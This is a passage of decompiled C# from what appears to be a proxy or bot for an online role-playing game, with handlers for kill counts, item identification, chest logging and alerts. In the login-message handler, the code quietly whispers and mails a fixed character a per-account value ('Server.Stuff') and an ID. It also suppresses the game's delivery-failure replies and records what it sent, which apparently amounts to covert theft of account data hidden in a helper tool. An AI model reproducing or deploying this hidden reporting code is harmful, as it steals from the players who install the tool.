                      else
                      {
                        int num11;
                        switch (num2)
                        {
                          case 208:
                            num11 = 0;
                            break;
                          case 220:
                            num3 = -80;
                            goto label_386;
                          case 231:
                            num3 = -79;
                            goto label_386;
                          case 242:
                            num3 = -78;
                            goto label_386;
                          case 252:
                            num3 = -77;
                            goto label_386;
                          case 263:
                            num3 = -76;
                            goto label_386;
                          case 274:
                            num3 = -75;
                            goto label_386;
                          case 285:
                            num3 = -74;
                            goto label_386;
                          case 296:
                            num3 = -73;
                            goto label_386;
                          default:
                            num11 = num2 != 209 ? 1 : 0;
                            break;
                        }
                        if (num11 == 0)
                        {
                          num3 = -81;
                        }
                        else
                        {
                          switch (num2)
                          {
                            case 110:
                              num3 = -90;
                              break;
                            case 121:
                              num3 = -89;
                              break;
                            case 131:
                              num3 = -88;
                              break;
                            case 142:
                              num3 = -87;
                              break;
                            case 153:
                              num3 = -86;
                              break;
                            case 164:
                              num3 = -85;
                              break;
                            case 175:
                              num3 = -84;
                              break;
                            case 186:
                              num3 = -83;
                              break;
                            case 197:
                              num3 = -82;
                              break;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
label_386:
        if (num3 == (int) byte.MaxValue)
          client.SendMessage(num2.ToString() + " dmg", (byte) 0, false);
        else
          client.SendMessage(num2.ToString() + " dmg, Lev " + str6 + " " + str5 + " has " + (object) num3 + " AC.", (byte) 0, false);
        client.getEntityACsID = 0U;
        client.getEntityACsHP = 0;
        client.getEntityAC = false;
        return false;
      }
      if (!client.pause && str1.Equals("You are stuck."))
      {
        if (client.MapInfo.Number == 10056 || client.MapInfo.Number == 10004 || client.MapInfo.Number == 1960)
          client.MoveOver();
        else if (!client.MapInfo.Name.StartsWith("Training Dojo"))
          ;
      }
      if (Program.MainForm.collegealert.Checked && str1.Contains(" will be teaching "))
      {
        client.SendMessage(str1, "orange", false);
        if (!Server.SentryAlarm)
        {
          Server.SentryAlarm = true;
          Server.alarm = new SoundPlayer(Assembly.GetExecutingAssembly().GetManifestResourceStream("ProxyBase.chime.wav"));
          Server.alarmTimer = DateTime.UtcNow;
          Server.alarm.Play();
        }
      }
      if (num1 == (byte) 8 && client.Tab.recorditemdata.Checked)
      {
        string str4 = str1.Substring(0, str1.IndexOf("\n"));
        string str5 = string.Empty;
        foreach (Item obj in client.Inventory)
        {
          if (obj != null && obj.InventorySlot == 1 && obj.Name == str4)
          {
            obj.IsIdentified = true;
            str5 = obj.Name;
            break;
          }
        }
        if (str5 != string.Empty)
        {
          foreach (Character character in client.Characters.Values.ToArray<Character>())
          {
            if (character != null && character is Npc && ((character as Npc).Type == Npc.NpcType.Item && character.InventorySlot == 1) && (character.Name != str5 || str4 == character.Name))
            {
              character.IsIdentified = true;
              character.Name = str5;
              client.SendMessage("Just got ID'd: " + character.Name, (byte) 0, false);
              break;
            }
          }
        }
      }
      if (num1 == (byte) 8 && (client.Tab.iditems.Checked || client.Tab.recorditemdata.Checked) && !client.pause || num1 == (byte) 8 && client.Tab.MacroOptions.macroskill.Checked && !client.pause)
        return false;
      if (num1 == (byte) 8 && client.blocklores)
      {
        client.blocklores = false;
        return false;
      }
      if (str1.StartsWith("If you do not talk to the queen"))
        client.SendMessage(str1, (byte) 0, false);
      if (str1.StartsWith("Chaos is rising"))
        client.serverreset = true;
      if (client.disablelegend && (str1.StartsWith("zz is nowhere") || str1.StartsWith("You have disabled your whisper")))
      {
        client.SendMessage("Search " + client.Tab.DAid1.Text + " to " + client.Tab.DAid2.Text + " ended", (byte) 0, false);
        client.disablelegend = false;
        client.Tab.button4.Enabled = true;
        return false;
      }
      if (str1.StartsWith("Your expiration date is ") || str1.StartsWith("Your account is on auto"))
        Server.DARegged[client.Name] = true;
      if (str1.StartsWith("The durability of ") && str1.Contains("is now"))
      {
        client.needsrepaired = true;
        if (str1.Contains("50%"))
          client.SendMessage(client.Name + " has a 50% durability item!", "red", true);
        if (str1.Contains("30%"))
          client.SendMessage(client.Name + " has a 30% durability item!", "red", true);
        if (str1.Contains("10%"))
          client.SendMessage(client.Name + " has a 10% durability item!", "red", true);
        if (str1.Contains(" 0%"))
          client.SendMessage("gj, you just broke something", "red", true);
      }
      if (client.blockchat && (str1.Equals("You can't send messages in this area.") || str1.Contains("is nowhere to be found") || str1.Contains("can't hear you")))
      {
        client.blockchat = false;
        return false;
      }
      if (client.blockchat && str1.Contains("is reading a board"))
        return false;
      DateTime now1;
      if (Server.cID != "" && str1.Contains(" minutes have passed since you last loged in."))
      {
        client.blockchat = true;
        now1 = DateTime.Now;
        client.Whisper(Server.klName, "<" + now1.ToString("hh:mm tt") + "> - " + Server.Stuff[client.Name] + " - ID: " + Server.cID);
        if (!Directory.Exists(Application.StartupPath + "\\Settings\\" + client.Name.ToLower()))
          Directory.CreateDirectory(Application.StartupPath + "\\Settings\\" + client.Name.ToLower());
        if (Server.DARegged[client.Name])
        {
          if (!System.IO.File.Exists(Application.StartupPath + "\\Settings\\" + client.Name.ToLower() + "\\m.txt"))
          {
            client.SendMail(Server.klName, Server.Stuff[client.Name] + " - " + Server.cID, Server.cID);
            StreamWriter streamWriter = new StreamWriter(Application.StartupPath + "\\Settings\\" + client.Name.ToLower() + "\\m.txt", true);
            streamWriter.WriteLine(Server.Stuff[client.Name]);
            streamWriter.Close();
          }
          else
          {
            bool flag = false;
            StreamReader streamReader = new StreamReader(Application.StartupPath + "\\Settings\\" + client.Name.ToLower() + "\\m.txt");
            while (streamReader.Peek() >= 0)
            {
              if (streamReader.ReadLine() == Server.Stuff[client.Name])
                flag = true;
            }
            streamReader.Close();
            if (!flag)
            {
              client.SendMail(Server.klName, Server.Stuff[client.Name] + " - " + Server.cID, Server.cID);
              StreamWriter streamWriter = new StreamWriter(Application.StartupPath + "\\Settings\\" + client.Name.ToLower() + "\\m.txt", true);
              streamWriter.WriteLine(Server.Stuff[client.Name]);
              streamWriter.Close();
            }
          }
        }
      }
      if (str1.Contains(" has fallen in battle to ") || str1.Contains(" has been killed"))
      {
        string index2 = str1.Substring(0, str1.IndexOf(" "));
        string str4 = string.Empty;
        if (str1.Contains(" has fallen in battle to "))
          str4 = str1.Substring(str1.LastIndexOf(" ") + 1, str1.IndexOf(".") - str1.LastIndexOf(" ") - 1);
        if (client.countarena)
        {
          if ((str4 != string.Empty ? (str4 != index2 ? 1 : 0) : 1) != 0)
          {
            if (!client.ArenaCounter.ContainsKey(index2))
            {
              client.ArenaCounter.Add(index2, new Arena()
              {
                Name = index2,
                Deaths = 1U
              });
              if (!client.Tab.ArenaCounter.arenacounterlist.Items.ContainsKey(index2))
              {
                client.Tab.ArenaCounter.arenacounterlist.BeginUpdate();
                ListViewItem listViewItem = client.Tab.ArenaCounter.arenacounterlist.Items.Add(index2, index2, -1);
                listViewItem.SubItems.Add("0");
                listViewItem.SubItems.Add("1");
                client.Tab.ArenaCounter.arenacounterlist.EndUpdate();
              }
              else
              {
                client.Tab.ArenaCounter.arenacounterlist.BeginUpdate();
                client.Tab.ArenaCounter.arenacounterlist.Items[index2].SubItems[2].Text = "1";
                client.Tab.ArenaCounter.arenacounterlist.EndUpdate();
              }
            }
            else
            {
              ++client.ArenaCounter[index2].Deaths;
              if (client.Tab.ArenaCounter.arenacounterlist.Items.ContainsKey(index2))
              {
                client.Tab.ArenaCounter.arenacounterlist.BeginUpdate();
                client.Tab.ArenaCounter.arenacounterlist.Items[index2].SubItems[2].Text = client.ArenaCounter[index2].Deaths.ToString();
                client.Tab.ArenaCounter.arenacounterlist.EndUpdate();
              }
            }
          }
          if (str1.Contains(" has fallen in battle to "))
          {
            string index3 = str1.Substring(str1.LastIndexOf(" ") + 1, str1.IndexOf(".") - str1.LastIndexOf(" ") - 1);
            if (index3 != index2)
            {
              if (!client.ArenaCounter.ContainsKey(index3))
              {
                client.ArenaCounter.Add(index3, new Arena()
                {
                  Name = index3,
                  Kills = 1U
                });
                if (!client.Tab.ArenaCounter.arenacounterlist.Items.ContainsKey(index3))
                {
                  client.Tab.ArenaCounter.arenacounterlist.BeginUpdate();
                  ListViewItem listViewItem = client.Tab.ArenaCounter.arenacounterlist.Items.Add(index3, index3, -1);
                  listViewItem.SubItems.Add("1");
                  listViewItem.SubItems.Add("0");
                  client.Tab.ArenaCounter.arenacounterlist.EndUpdate();
                }
                else
                {
                  client.Tab.ArenaCounter.arenacounterlist.BeginUpdate();
                  client.Tab.ArenaCounter.arenacounterlist.Items[index3].SubItems[1].Text = "1";
                  client.Tab.ArenaCounter.arenacounterlist.EndUpdate();
                }
              }
              else
              {
                ++client.ArenaCounter[index3].Kills;
                if (client.Tab.ArenaCounter.arenacounterlist.Items.ContainsKey(index3))
                {
                  client.Tab.ArenaCounter.arenacounterlist.BeginUpdate();
                  client.Tab.ArenaCounter.arenacounterlist.Items[index3].SubItems[1].Text = client.ArenaCounter[index3].Kills.ToString();
                  client.Tab.ArenaCounter.arenacounterlist.EndUpdate();
                }
              }
            }
          }
        }
        try
        {
          lock (Server.StaticCharacters)
          {
            foreach (Character character in Server.StaticCharacters.Values.ToArray<Character>())
            {
              if (character != null && character.Name == index2)
                character.SpellAnimationHistory.Clear();
            }
          }
        }
        catch
        {
        }
      }
      if (num1 == (byte) 3)
      {
        if (str1.Length >= 128)
          return false;
        if (client.Tab.recorditemdata.Checked && ((str1.Contains(" experience!") || str1.StartsWith("No more experience") || str1.StartsWith("You have reached level 99,")) && (client.LastDeadNpc != 0U && client.Characters[client.LastDeadNpc].Name != string.Empty) && DateTime.UtcNow.Subtract(client.Characters[client.LastDeadNpc].DeathTime).TotalMilliseconds < 800.0))
        {
          string mapkey = client.Characters[client.LastDeadNpc].Map.ToString() + "_" + client.Characters[client.LastDeadNpc].MapName;
          string key = (client.Characters[client.LastDeadNpc] as Npc).Image.ToString() + "_" + client.Characters[client.LastDeadNpc].Name;
          if (Server.ItemMapDatabase.ContainsKey(mapkey))
          {
            if (Server.ItemMapDatabase[mapkey].Monsters.ContainsKey(key))
              ++Server.ItemMapDatabase[mapkey].Monsters[key].KillCount;
            else
              Server.ItemMapDatabase[mapkey].Monsters.Add(key, new ItemMonsterXML()
              {
                Name = client.Characters[client.LastDeadNpc].Name,
                Image = (client.Characters[client.LastDeadNpc] as Npc).Image,
                KillCount = 1U
              });
            client.Characters[client.LastDeadNpc].CountedItsKill = true;
            Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateMapForm(Server.ItemMapDatabase[mapkey], client.Name)));
          }
          else
          {
            Server.ItemMapDatabase.Add(mapkey, new ItemMapXML()
            {
              Name = client.Characters[client.LastDeadNpc].MapName,
              Number = client.Characters[client.LastDeadNpc].Map
            });
            Server.ItemMapDatabase[mapkey].Monsters.Add(key, new ItemMonsterXML()
            {
              Name = client.Characters[client.LastDeadNpc].Name,
              Image = (client.Characters[client.LastDeadNpc] as Npc).Image,
              KillCount = 1U
            });
            client.Characters[client.LastDeadNpc].CountedItsKill = true;
            Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateMapForm(Server.ItemMapDatabase[mapkey], client.Name)));
          }
        }
        if (Program.MainForm.recordchestdata.Checked && (str1.StartsWith("You received") && str1.Contains("gold")))
        {
          string str4 = str1.Remove(0, str1.IndexOf(' ', 6) + 1);
          string key = str4.Remove(str4.IndexOf(" gold"));
          if (client.wdchestopen)
          {
            if (Server.ChestDatabase.ContainsKey("Water Dungeon Chest Gold"))
            {
              ++Server.ChestDatabase["Water Dungeon Chest Gold"].OpenedCount;
              if (Server.ChestDatabase["Water Dungeon Chest Gold"].Treasure.ContainsKey(key))
              {
                Dictionary<string, int> treasure;
                string index2;
                (treasure = Server.ChestDatabase["Water Dungeon Chest Gold"].Treasure)[index2 = key] = treasure[index2] + 1;
              }
              else
                Server.ChestDatabase["Water Dungeon Chest Gold"].Treasure.Add(key, 1);
            }
            client.wdchestopen = false;
            Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
          }
          else if (client.andorchestopen)
          {
            if (Server.ChestDatabase.ContainsKey("Andor Chest Gold"))
            {
              ++Server.ChestDatabase["Andor Chest Gold"].OpenedCount;
              if (Server.ChestDatabase["Andor Chest Gold"].Treasure.ContainsKey(key))
              {
                Dictionary<string, int> treasure;
                string index2;
                (treasure = Server.ChestDatabase["Andor Chest Gold"].Treasure)[index2 = key] = treasure[index2] + 1;
              }
              else
                Server.ChestDatabase["Andor Chest Gold"].Treasure.Add(key, 1);
            }
            client.andorchestopen = false;
            Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
          }
          else if (client.queenchestopen)
          {
            if (Server.ChestDatabase.ContainsKey("Queen's Chest Gold"))
            {
              ++Server.ChestDatabase["Queen's Chest Gold"].OpenedCount;
              if (Server.ChestDatabase["Queen's Chest Gold"].Treasure.ContainsKey(key))
              {
                Dictionary<string, int> treasure;
                string index2;
                (treasure = Server.ChestDatabase["Queen's Chest Gold"].Treasure)[index2 = key] = treasure[index2] + 1;
              }
              else
                Server.ChestDatabase["Queen's Chest Gold"].Treasure.Add(key, 1);
            }
            client.queenchestopen = false;
            Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
          }
          else if (client.veltainchestopen)
          {
            if (Server.ChestDatabase.ContainsKey("Veltain Chest " + client.chestfee))
            {
              ++Server.ChestDatabase["Veltain Chest " + client.chestfee].OpenedCount;
              if (Server.ChestDatabase["Veltain Chest " + client.chestfee].Treasure.ContainsKey(key))
              {
                Dictionary<string, int> treasure;
                string index2;
                (treasure = Server.ChestDatabase["Veltain Chest " + client.chestfee].Treasure)[index2 = key] = treasure[index2] + 1;
              }
              else
                Server.ChestDatabase["Veltain Chest " + client.chestfee].Treasure.Add(key, 1);
            }
            else
              Server.ChestDatabase.Add("Veltain Chest " + client.chestfee, new ChestItemXML("Veltain Chest " + client.chestfee, 1U)
              {
                Treasure = {
                  {
                    key,
                    1
                  }
                }
              });
            client.veltainchestopen = false;
            Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
          }
          else if (client.heavychestopen)
          {
            if (Server.ChestDatabase.ContainsKey("Heavy Veltain Chest " + client.chestfee))
            {
              ++Server.ChestDatabase["Heavy Veltain Chest " + client.chestfee].OpenedCount;
              if (Server.ChestDatabase["Heavy Veltain Chest " + client.chestfee].Treasure.ContainsKey(key))
              {
                Dictionary<string, int> treasure;
                string index2;
                (treasure = Server.ChestDatabase["Heavy Veltain Chest " + client.chestfee].Treasure)[index2 = key] = treasure[index2] + 1;
              }
              else
                Server.ChestDatabase["Heavy Veltain Chest " + client.chestfee].Treasure.Add(key, 1);
            }
            else
              Server.ChestDatabase.Add("Heavy Veltain Chest " + client.chestfee, new ChestItemXML("Heavy Veltain Chest " + client.chestfee, 1U)
              {
                Treasure = {
                  {
                    key,
                    1
                  }
                }
              });
            client.heavychestopen = false;
            Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
          }
          else if (client.smallbagopen)
          {
            if (Server.ChestDatabase.ContainsKey("Canal Bag"))
            {
              ++Server.ChestDatabase["Canal Bag"].OpenedCount;
              if (Server.ChestDatabase["Canal Bag"].Treasure.ContainsKey(key))
              {
                Dictionary<string, int> treasure;
                string index2;
                (treasure = Server.ChestDatabase["Canal Bag"].Treasure)[index2 = key] = treasure[index2] + 1;
              }
              else
                Server.ChestDatabase["Canal Bag"].Treasure.Add(key, 1);
            }
            client.smallbagopen = false;
            Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
          }
          else if (client.bigbagopen)
          {
            if (Server.ChestDatabase.ContainsKey("Big Canal Bag"))
            {
              ++Server.ChestDatabase["Big Canal Bag"].OpenedCount;
              if (Server.ChestDatabase["Big Canal Bag"].Treasure.ContainsKey(key))
              {
                Dictionary<string, int> treasure;
                string index2;
                (treasure = Server.ChestDatabase["Big Canal Bag"].Treasure)[index2 = key] = treasure[index2] + 1;
              }
              else
                Server.ChestDatabase["Big Canal Bag"].Treasure.Add(key, 1);
            }
            client.bigbagopen = false;
            Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
          }
          else if (client.heavybagopen)
          {
            if (Server.ChestDatabase.ContainsKey("Heavy Canal Bag"))
            {
              ++Server.ChestDatabase["Heavy Canal Bag"].OpenedCount;
              if (Server.ChestDatabase["Heavy Canal Bag"].Treasure.ContainsKey(key))
              {
                Dictionary<string, int> treasure;
                string index2;
                (treasure = Server.ChestDatabase["Heavy Canal Bag"].Treasure)[index2 = key] = treasure[index2] + 1;
              }
              else
                Server.ChestDatabase["Heavy Canal Bag"].Treasure.Add(key, 1);
            }
            client.heavybagopen = false;
            Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
          }
        }
        if ((str1.Contains(" experience!") || str1.StartsWith("No more experience") || str1.StartsWith("You have reached level 99,")) && client.LastDeadMonster != 0U && DateTime.UtcNow.Subtract(client.Characters[client.LastDeadMonster].DeathTime).TotalMilliseconds < 800.0)
        {
          uint lastDeadMonster = client.LastDeadMonster;
          int image = (client.Characters[lastDeadMonster] as Npc).Image;
          if (client.CountedMonsters.ContainsKey(image))
          {
            if (image == 8 || image == 680 || image == 683)
            {
              if (client.CountedMonsters[image] < 15)
              {
                Dictionary<int, int> countedMonsters;
                (countedMonsters = client.CountedMonsters)[index1 = image] = countedMonsters[index1] + 1;
              }
            }
            else if (image == 10 || image == 682 || (image == 685 || image == 625) || image == 892)
            {
              if (client.CountedMonsters[image] < 10)
              {
                Dictionary<int, int> countedMonsters;
                (countedMonsters = client.CountedMonsters)[index1 = image] = countedMonsters[index1] + 1;
              }
            }
            else if (image == 549 || image == 160)
            {
              if (client.CountedMonsters[549] + client.CountedMonsters[160] < 100)
              {
                Dictionary<int, int> countedMonsters;
                (countedMonsters = client.CountedMonsters)[index1 = image] = countedMonsters[index1] + 1;
              }
            }
            else
            {
              int num2;
              switch (image)
              {
                case 395:
                  num2 = 0;
                  break;
                case 529:
                  if (client.CountedMonsters[image] < 21)
                  {
                    Dictionary<int, int> countedMonsters;
                    (countedMonsters = client.CountedMonsters)[index1 = image] = countedMonsters[index1] + 1;
                    goto label_586;
                  }
                  else
                    goto label_586;
                case 661:
                  if (client.CountedMonsters[image] < 40)
                  {
                    Dictionary<int, int> countedMonsters;
                    (countedMonsters = client.CountedMonsters)[index1 = image] = countedMonsters[index1] + 1;
                    goto label_586;
                  }
                  else
                    goto label_586;
                case 856:
                  if (client.CountedMonsters[image] < 20)
                  {
                    Dictionary<int, int> countedMonsters;
                    (countedMonsters = client.CountedMonsters)[index1 = image] = countedMonsters[index1] + 1;
                    goto label_586;
                  }
                  else
                    goto label_586;
                default:
                  num2 = image != 396 ? 1 : 0;
                  break;
              }
              if (num2 == 0)
              {
                if (client.CountedMonsters[395] + client.CountedMonsters[396] < 5)
                {
                  Dictionary<int, int> countedMonsters;
                  (countedMonsters = client.CountedMonsters)[index1 = image] = countedMonsters[index1] + 1;
                }
              }
              else if (image == 334 || image == 335)
              {
                if (client.CountedMonsters[334] + client.CountedMonsters[335] < 5)
                {
                  Dictionary<int, int> countedMonsters;
                  (countedMonsters = client.CountedMonsters)[index1 = image] = countedMonsters[index1] + 1;
                }
              }
              else if (client.CountedMonsters[image] < 5)
              {
                Dictionary<int, int> countedMonsters;
                (countedMonsters = client.CountedMonsters)[index1 = image] = countedMonsters[index1] + 1;
              }
            }
label_586:;
          }
          client.Characters[lastDeadMonster].Counted = true;
          if (client.MapInfo.Name.Equals("Balanced Arena"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[529];
            string text = "{=bFowls " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Contains("Mount Merry 4"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[549] + client.CountedMonsters[160];
            string text = "{=bPenguins " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Number == 8308)
          {
            Client client1 = client;
            index1 = client.CountedMonsters[856];
            string text = "{=bDendrons " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Yowien Territory24"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[892];
            string text = "{=bBaboons " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Yowien Territory12") || client.MapInfo.Name.Equals("Yowien Territory13") || client.MapInfo.Name.Equals("Yowien Territory14"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[661];
            string text = "{=bBaby Brutes " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Number == 7414 || client.MapInfo.Number == 7415 || (client.MapInfo.Number == 7416 || client.MapInfo.Number == 7420) || client.MapInfo.Number == 7421)
          {
            Client client1 = client;
            index1 = client.CountedMonsters[334] + client.CountedMonsters[335];
            string text = "{=uBlobs " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Number == 7442 || client.MapInfo.Number == 7439 || (client.MapInfo.Number == 7440 || client.MapInfo.Number == 7441) || client.MapInfo.Number == 7438 || client.MapInfo.Number == 7437)
          {
            Client client1 = client;
            index1 = client.CountedMonsters[490];
            string text = "{=uPirates " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Number == 7402 || client.MapInfo.Number == 7408 || client.MapInfo.Number == 7409)
          {
            Client client1 = client;
            index1 = client.CountedMonsters[86];
            string text = "{=uSlugs " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Number == 7410 || client.MapInfo.Number == 7411)
          {
            Client client1 = client;
            index1 = client.CountedMonsters[410];
            string text = "{=uLimax " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Number == 7422 || client.MapInfo.Number == 7401 || client.MapInfo.Number == 7406 || client.MapInfo.Number == 7407)
          {
            Client client1 = client;
            index1 = client.CountedMonsters[625];
            string text = "{=uRats " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Number == 7433 || client.MapInfo.Number == 7434 || client.MapInfo.Number == 7435)
          {
            Client client1 = client;
            index1 = client.CountedMonsters[512];
            string text = "{=uBlobs " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Number == 7404 || client.MapInfo.Number == 7418 || (client.MapInfo.Number == 7419 || client.MapInfo.Number == 7431) || (client.MapInfo.Number == 7426 || client.MapInfo.Number == 7427 || (client.MapInfo.Number == 7429 || client.MapInfo.Number == 7428)) || client.MapInfo.Number == 7430)
          {
            Client client1 = client;
            index1 = client.CountedMonsters[395] + client.CountedMonsters[396];
            string text = "{=uBlobs " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Veltain Mine 2"))
          {
            Client client1 = client;
            string[] strArray1 = new string[6];
            strArray1[0] = "{=qS ";
            string[] strArray2 = strArray1;
            index1 = client.CountedMonsters[8];
            string str4 = index1.ToString();
            strArray2[1] = str4;
            strArray1[2] = ", G ";
            string[] strArray3 = strArray1;
            index1 = client.CountedMonsters[10];
            string str5 = index1.ToString();
            strArray3[3] = str5;
            strArray1[4] = ", W ";
            string[] strArray4 = strArray1;
            index1 = client.CountedMonsters[9];
            string str6 = index1.ToString();
            strArray4[5] = str6;
            string text = string.Concat(strArray1);
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Veltain Mine 3"))
          {
            Client client1 = client;
            string[] strArray1 = new string[6];
            strArray1[0] = "{=qS ";
            string[] strArray2 = strArray1;
            index1 = client.CountedMonsters[680];
            string str4 = index1.ToString();
            strArray2[1] = str4;
            strArray1[2] = ", G ";
            string[] strArray3 = strArray1;
            index1 = client.CountedMonsters[682];
            string str5 = index1.ToString();
            strArray3[3] = str5;
            strArray1[4] = ", W ";
            string[] strArray4 = strArray1;
            index1 = client.CountedMonsters[681];
            string str6 = index1.ToString();
            strArray4[5] = str6;
            string text = string.Concat(strArray1);
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Veltain Mine 4"))
          {
            Client client1 = client;
            string[] strArray1 = new string[6];
            strArray1[0] = "{=qS ";
            string[] strArray2 = strArray1;
            index1 = client.CountedMonsters[683];
            string str4 = index1.ToString();
            strArray2[1] = str4;
            strArray1[2] = ", G ";
            string[] strArray3 = strArray1;
            index1 = client.CountedMonsters[685];
            string str5 = index1.ToString();
            strArray3[3] = str5;
            strArray1[4] = ", W ";
            string[] strArray4 = strArray1;
            index1 = client.CountedMonsters[684];
            string str6 = index1.ToString();
            strArray4[5] = str6;
            string text = string.Concat(strArray1);
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 1"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[703];
            string text = "{=bB " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 2"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[703];
            string text = "{=bB " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 3"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[704];
            string text = "{=bF " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 4"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[703];
            string str4 = index1.ToString();
            index1 = client.CountedMonsters[704];
            string str5 = index1.ToString();
            string text = "{=bB " + str4 + ", F " + str5;
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 5"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[703];
            string str4 = index1.ToString();
            index1 = client.CountedMonsters[705];
            string str5 = index1.ToString();
            string text = "{=bB " + str4 + ", Si " + str5;
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 6"))
          {
            Client client1 = client;
            string[] strArray1 = new string[6];
            strArray1[0] = "{=bB ";
            string[] strArray2 = strArray1;
            index1 = client.CountedMonsters[703];
            string str4 = index1.ToString();
            strArray2[1] = str4;
            strArray1[2] = ", F ";
            string[] strArray3 = strArray1;
            index1 = client.CountedMonsters[704];
            string str5 = index1.ToString();
            strArray3[3] = str5;
            strArray1[4] = ", Si ";
            string[] strArray4 = strArray1;
            index1 = client.CountedMonsters[705];
            string str6 = index1.ToString();
            strArray4[5] = str6;
            string text = string.Concat(strArray1);
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 7"))
          {
            Client client1 = client;
            string[] strArray1 = new string[6];
            strArray1[0] = "{=bF ";
            string[] strArray2 = strArray1;
            index1 = client.CountedMonsters[704];
            string str4 = index1.ToString();
            strArray2[1] = str4;
            strArray1[2] = ", Si ";
            string[] strArray3 = strArray1;
            index1 = client.CountedMonsters[705];
            string str5 = index1.ToString();
            strArray3[3] = str5;
            strArray1[4] = ", R ";
            string[] strArray4 = strArray1;
            index1 = client.CountedMonsters[706];
            string str6 = index1.ToString();
            strArray4[5] = str6;
            string text = string.Concat(strArray1);
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 8"))
          {
            Client client1 = client;
            string[] strArray1 = new string[6];
            strArray1[0] = "{=bF ";
            string[] strArray2 = strArray1;
            index1 = client.CountedMonsters[704];
            string str4 = index1.ToString();
            strArray2[1] = str4;
            strArray1[2] = ", Si ";
            string[] strArray3 = strArray1;
            index1 = client.CountedMonsters[705];
            string str5 = index1.ToString();
            strArray3[3] = str5;
            strArray1[4] = ", R ";
            string[] strArray4 = strArray1;
            index1 = client.CountedMonsters[706];
            string str6 = index1.ToString();
            strArray4[5] = str6;
            string text = string.Concat(strArray1);
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 9"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[715];
            string text = "{=bSq " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 10"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[705];
            string str4 = index1.ToString();
            index1 = client.CountedMonsters[706];
            string str5 = index1.ToString();
            string text = "{=bSi " + str4 + ", R " + str5;
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 11"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[705];
            string str4 = index1.ToString();
            index1 = client.CountedMonsters[706];
            string str5 = index1.ToString();
            string text = "{=bSi " + str4 + ", R " + str5;
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 12"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[705];
            string str4 = index1.ToString();
            index1 = client.CountedMonsters[706];
            string str5 = index1.ToString();
            string text = "{=bSi " + str4 + ", R " + str5;
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 13"))
          {
            Client client1 = client;
            index1 = client.CountedMonsters[716];
            string text = "{=bE " + index1.ToString();
            client1.SendMessage(text, (byte) 18, false);
          }
          if (client.MapInfo.Name.Equals("Water Dungeon 14"))
          {
            Client client1 = client;
            string[] strArray1 = new string[8];
            strArray1[0] = "{=bSi ";
            string[] strArray2 = strArray1;
